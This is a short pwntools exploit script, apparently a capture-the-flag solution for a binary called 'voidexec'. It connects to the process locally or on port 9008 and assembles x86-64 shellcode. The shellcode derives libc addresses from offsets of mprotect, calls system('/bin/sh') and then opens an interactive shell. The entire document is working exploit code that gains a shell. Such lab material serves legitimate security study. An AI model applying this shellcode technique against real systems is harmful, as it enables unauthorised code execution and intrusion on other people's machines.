from pwn import *

target = ELF("./voidexec")
context.binary = target

libc_local = ELF(target.libc.path)

if args.REMOTE:
    conn = remote("127.0.0.1", 9008)
else:
    conn = process(target.path)
    if args.GDB:
        gdb_script = "continue\n"
        gdb.attach(conn, gdbscript=gdb_script)

# Construct the shellcode that calls system("/bin/sh"):
shellcode = asm(f"""
    sub rcx, {libc_local.sym.mprotect + 0x0b}
    mov r12, rcx
    add rcx, {libc_local.sym.system}
    mov rdi, r12
    add rdi, {next(libc_local.search(b'/bin/sh'))}
    jmp rcx
""")

# Transmit the shellcode payload to the process
conn.sendline(shellcode)
conn.interactive()
